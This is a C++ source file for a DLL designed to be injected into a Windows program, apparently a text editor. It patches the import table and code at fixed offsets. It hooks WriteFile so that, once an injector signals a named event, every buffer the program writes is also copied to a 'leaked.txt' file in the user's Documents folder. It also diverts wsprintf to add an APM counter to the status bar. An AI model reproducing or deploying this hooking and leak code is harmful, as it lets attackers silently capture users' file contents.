// dllmain.cpp : DLL 애플리케이션의 진입점을 정의합니다.
#include "pch.h"
#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <iostream>
#include <chrono>
#include <ctime>
#include <cstdio>
#include <windows.h>
#include <thread>
#include <tchar.h>

const wchar_t* pth;
int attack = 0;
int apm;
int k = 0;
const char* mali = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>";
const char mal[] = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>";
int tmp_count = 0;
int keyCount = 0;
int first = 1;
DWORD updateBar;
int class_addr;
int flag = 1;
int thr = 1;
DWORD wsprintf_rva = 0x3b3830;
DWORD image_base = 0;
DWORD edit_rva = 0xDE597;
DWORD edit_va = 0;
DWORD updateBar_rva = 0xde500;
const TCHAR* testStr = L"helloooooooooooo";
char editbuf[6];
int ts;
wchar_t time_spend[20];
char buf[0x2000];
char buf2[0x2000];

wchar_t* ConverCtoWC(const char* str) // https://goguri.tistory.com/1393
{
    //wchar_t형 변수 선언
    wchar_t* pStr;



    //멀티 바이트 크기 계산 길이 반환
    int strSize = MultiByteToWideChar(CP_ACP, 0, str, -1, NULL, NULL);



    //wchar_t 메모리 할당
    pStr = new WCHAR[strSize];



    //형 변환
    MultiByteToWideChar(CP_ACP, 0, str, strlen(str) + 1, pStr, strSize);
    return pStr;

}

DWORD WINAPI WaitForEvent(LPVOID lpParam) {
    // Open the named event with SYNCHRONIZE access since we only need to wait on it
    HANDLE hEvent = OpenEvent(SYNCHRONIZE, FALSE, TEXT("Global\\keto1234"));
    if (hEvent == NULL) {
        std::cerr << "Failed to open event: " << GetLastError() << std::endl;
        return 1;  // Use specific error codes or logging as appropriate
    }

    std::cout << "Waiting for signal from injector..." << std::endl;

    // Wait for the event to be signaled
    DWORD waitResult = WaitForSingleObject(hEvent, INFINITE);
    switch (waitResult) {
    case WAIT_OBJECT_0:
        OutputDebugStringA("Event was signaled.");
        attack = 1;
        break;
    case WAIT_FAILED:

        OutputDebugStringA("Wait failed");
        break;
    default:

        OutputDebugStringA("Unexpected wait result.");
        break;
    }

    // Clean up
    CloseHandle(hEvent);
    return 0;
}


bool compareLPCWSTR(LPCWSTR str1, LPCWSTR str2) {
    // 두 LPCWSTR 문자열을 비교합니다.
    return wcscmp(str1, str2) == 0;
}



std::chrono::system_clock::time_point program_start;
void updateTimeSpend() {
    // 현재 시간
    auto now = std::chrono::system_clock::now();

    // 시작 시간과 현재 시간 사이의 경과 시간 계산
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - program_start);
    long total_seconds = elapsed.count();

    // 전체 일수, 시간, 분, 초 계산
    int days = total_seconds / (24 * 3600);
    total_seconds %= (24 * 3600);
    int hours = total_seconds / 3600;
    total_seconds %= 3600;
    int minutes = total_seconds / 60;
    int seconds = total_seconds % 60;
    ts = 1 + total_seconds;

    // 형식화된 시간 문자열 저장
    swprintf(time_spend, sizeof(time_spend) / sizeof(wchar_t), L"%d:%02d:%02d:%02d", days, hours, minutes, seconds);

    // 시간 문자열 출력 (디버깅용)
    std::wcout << L"Time spent: " << time_spend << std::endl;
}


void updateAPM() {
    auto now = std::chrono::system_clock::now();
    auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - program_start);
    double minutes = elapsed.count() / 60.0;
    apm = static_cast<int>(keyCount / minutes);

    sprintf_s(buf, sizeof(buf), "APM: %d keycount %d\n", apm, keyCount);
    OutputDebugStringA(buf);
}


const char* a;




void UpdateStatusBarThread(DWORD func, DWORD addr) {
    char buf4[100];

    while (true) {
        __asm {
            mov ecx, addr
            call func
        }
        keyCount--;
        OutputDebugStringA("Called class function\n");

        std::this_thread::sleep_for(std::chrono::seconds(1));


    }
}




int WINAPIV user_wsprintf(LPWSTR unnamedParam1, LPCWSTR unnamedParam2, const wchar_t* unnamedParam3, const wchar_t* unnamedParam4) {
    // wsprintf 주소를 계산하여 edi에 설정
    int important;
    DWORD wsprintf_va = image_base + wsprintf_rva;
    __asm {
        mov important, ebx
        mov eax, wsprintf_va // eax에 wsprintf_va 값을 로드
        mov edi, eax         // eax 값을 edi에 이동
    }
    bool areEqual = compareLPCWSTR(L"length : %s    lines : %s", unnamedParam2);
    if (areEqual) {
        const wchar_t* sourceString = L"%s/APM:%d len:%s line:%s";
        class_addr = important;
        sprintf_s(buf2, sizeof(buf2), "class adress is %x!!\n", important);
        OutputDebugStringA(buf2);
        updateBar = updateBar_rva + image_base;
        if (thr == 1) {
            std::thread(UpdateStatusBarThread, updateBar, class_addr).detach();
        }
        thr = 0;
        //wcscpy_s(unnamedParam1, wcslen(sourceString) + 1, sourceString);
        //swprintf(unnamedParam1, 256, L"length: %s lines: %s", sourceString, sourceString);
        // 버퍼 선언
        sprintf_s(buf2, sizeof(buf2), "user_wsprintf success!!\n");
        OutputDebugStringA(buf2);

        // 시간 업데이트 함수 호출
        updateTimeSpend();
        char buf5[1000];
        //char* un3 = ConvertWCtoC(unnamedParam3);
        keyCount++;
        updateAPM();
        first = 0;
        int result = wsprintf(unnamedParam1, sourceString, time_spend, apm, unnamedParam3, unnamedParam4); // wide 문자열 형식 사용
        __asm {
            mov eax, wsprintf_va // eax에 wsprintf_va 값을 로드
            mov edi, eax         // eax 값을 edi에 이동
        }

        return result;
    }
    else {



        char buf5[1000];
        //sprintf_s(buf5, sizeof(buf5), "%s : %s : %s",unnamedParam2,unnamedParam3,unnamedParam4);
        //OutputDebugStringA(buf5);
        // wsprintf를 사용하여 형식화된 문자열 생성

        int result = wsprintf(unnamedParam1, unnamedParam2, unnamedParam3, unnamedParam4); // wide 문자열 형식 사용

        __asm {
            mov eax, wsprintf_va // eax에 wsprintf_va 값을 로드
            mov edi, eax         // eax 값을 edi에 이동
        }

        return result;
    }


    const wchar_t* sourceString = L"length: %s lines: %s";

    sprintf_s(buf2, sizeof(buf2), "user_wsprintf success!!\n");
    OutputDebugStringA(buf2);

    // 시간 업데이트 함수 호출
    updateTimeSpend();
    char buf5[1000];

    int result = wsprintf(unnamedParam1, unnamedParam2, unnamedParam3, unnamedParam4);

    __asm {
        mov eax, wsprintf_va
        mov edi, eax
    }

    return result;
}
BOOL WINAPI FakeWriteFile(HANDLE hfile, LPCVOID lpBuffer, DWORD nNUMOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped) {
    if (attack == 0) {
        return WriteFile(hfile, lpBuffer, nNUMOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }
    snprintf(buf, sizeof(buf), "FAKEWRITEFILE() hit: nNumberOfBytesToWrite = %lu\n", nNUMOfBytesToWrite);
    OutputDebugStringA(buf);
    char buff[41];
    // lpBuffer를 복사하여 수정 가능한 버퍼로 만듭니다.
    char  modifiableBuffer[10000];
    memcpy(modifiableBuffer, lpBuffer, nNUMOfBytesToWrite);
    if (!memcmp(modifiableBuffer, mali, 38) && (nNUMOfBytesToWrite > 500)) {
        OutputDebugStringA("system write is detected\n");
        return WriteFile(hfile, lpBuffer, nNUMOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
    }

    snprintf(buf, sizeof(buf), "FAKE %s\n", modifiableBuffer);
    OutputDebugStringA(buf);
    if (1) {
        // "C:\\ubuntu\\leak.txt"에 해당 함수로 쓰려고 하는 버퍼를 저장
        HANDLE hLeakFile = CreateFile( // 어셈블리 숨기기 + 주소 우회하기
            pth,
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hLeakFile == INVALID_HANDLE_VALUE) {
            OutputDebugStringA("Failed to open leak file.");
            return FALSE;
        }

        // 파일의 끝으로 이동
        SetFilePointer(hLeakFile, 0, NULL, FILE_BEGIN);// 끝으로 보내니깐 중복됨.
        snprintf(buf, sizeof(buf), "QWERFAKEWRITEFILE() hit: handle = %u\n", (DWORD)hfile);
        OutputDebugStringA(buf);

        DWORD bytesWritten;
        WriteFile(hLeakFile, modifiableBuffer, nNUMOfBytesToWrite, &bytesWritten, NULL);


        CloseHandle(hLeakFile);

        OutputDebugStringA("Buffer written to leak file.");
    }
    else {
        OutputDebugStringA("XML pattern detected, not writing to leak file.");
    }


    BOOL result = WriteFile(hfile, lpBuffer, nNUMOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);


    return result;
}






void PatchIAT(LPDWORD lpAddress, DWORD data) {
    DWORD fl0ldProtect, fl0ldProtect2;
    VirtualProtect((LPVOID)lpAddress, sizeof(DWORD), PAGE_READWRITE, &fl0ldProtect);
    *lpAddress = data;
    VirtualProtect((LPVOID)lpAddress, sizeof(DWORD), fl0ldProtect, &fl0ldProtect2);

}
void PatchCode(LPDWORD lpAddress, char* data, DWORD data_len) {
    DWORD fl0ldProtect, fl0ldProtect2;
    VirtualProtect((LPVOID)lpAddress, data_len, PAGE_READWRITE, &fl0ldProtect);
    memcpy(lpAddress, data, data_len);
    VirtualProtect((LPVOID)lpAddress, sizeof(DWORD), fl0ldProtect, &fl0ldProtect2);

}
BOOL hack() {

    const char* UserProfile = getenv("USERPROFILE");
    if (!UserProfile) {
        std::cerr << "Failed to get USERPROFILE environment variable." << std::endl;
        return 1;
    }


    std::string filePath = std::string(UserProfile) + "\\Documents\\leaked.txt";


    const char* pat = filePath.c_str();
    pth = ConverCtoWC(pat);


    OutputDebugStringA(buf2);
    LPDWORD lpTarget = (LPDWORD)((char*)GetModuleHandleA(NULL) + 0x3B320c);
    PatchIAT((LPDWORD)lpTarget, (DWORD)FakeWriteFile);
    DWORD ad = (DWORD)user_wsprintf;
    *editbuf = 0xBF;
    *(editbuf + 1) = ad & 0xff;
    *(editbuf + 2) = (ad >> 8) & 0xff;
    *(editbuf + 3) = (ad >> 16) & 0xff;
    *(editbuf + 4) = (ad >> 24) & 0xff;
    *(editbuf + 5) = 0x90; //nop





    lpTarget = (LPDWORD)((char*)GetModuleHandleA(NULL) + edit_rva);
    PatchCode(lpTarget, editbuf, 6);


    return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateThread(NULL, 0, WaitForEvent, NULL, 0, NULL);


        program_start = std::chrono::system_clock::now();
        image_base = (DWORD)GetModuleHandleA(NULL);
        edit_va = image_base + edit_rva;



        hack();

        break;



    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:

        break;
    }
    return TRUE;
}
